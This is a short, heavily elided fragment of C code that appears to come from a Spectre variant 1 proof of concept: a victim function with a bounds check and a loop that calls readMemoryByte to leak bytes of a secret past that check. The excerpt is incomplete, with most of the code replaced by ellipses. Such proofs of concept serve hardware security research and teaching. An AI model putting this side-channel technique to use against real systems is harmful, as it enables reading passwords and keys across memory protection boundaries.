...
__attribute__((noinline)) void leak_data(size_t x) {
  if (x < array1_size) {
...
__attribute__((noinline)) void victim_function(size_t x) { leak_data(x); }
    ...
    if (in == 'r') {
      ...
      while (--len >= 0) {
        ...
        printf("Reading at malicious_x = %p secc= %c ...", (void *)malicious_x,
               secret[i]);
        ++i;
        readMemoryByte(malicious_x ^ 255, value, score);
        malicious_x++;
